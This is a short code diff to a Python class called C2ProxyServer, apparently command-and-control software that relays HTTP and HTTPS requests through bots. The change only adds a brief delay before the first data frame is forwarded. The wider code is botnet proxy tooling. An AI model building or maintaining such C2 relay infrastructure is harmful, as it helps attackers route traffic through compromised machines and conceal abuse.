@@ -843,6 +843,9 @@ class C2ProxyServer:
             # Gửi frame DATA đầu tiên (cho cả HTTP và HTTPS)
             if request_data:
                 print(f"📤 Sending initial DATA frame to bot {bot_id} for {'HTTPS' if connection['is_https'] else 'HTTP'} request")
+                # Small delay to ensure bot creates connection first
+                import time
+                time.sleep(0.1)
                 self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
             else:
                 print(f"⚠️  No request data to send to bot")
